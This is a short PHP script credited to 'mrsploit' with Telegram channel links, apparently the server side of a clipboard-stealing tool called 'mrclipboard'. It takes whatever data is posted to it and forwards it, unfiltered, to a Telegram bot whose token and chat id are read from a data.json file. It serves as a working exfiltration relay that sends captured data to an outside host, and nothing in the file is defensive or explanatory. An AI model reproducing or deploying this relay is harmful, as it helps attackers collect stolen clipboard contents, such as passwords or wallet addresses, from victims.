<!--
mrclipboard v1
Code By mrsploit
t.me/mrsploit
t.me/zoneh
-->
<?php
$content = trim(file_get_contents("php://input"));
$data_bot = file_get_contents('data.json');
$dejson = json_decode($data_bot, true);
$website="https://api.telegram.org/bot".$dejson['token']."/sendMessage?chat_id=".$dejson['chat_id']."&text=".$content;
file_get_contents($website);
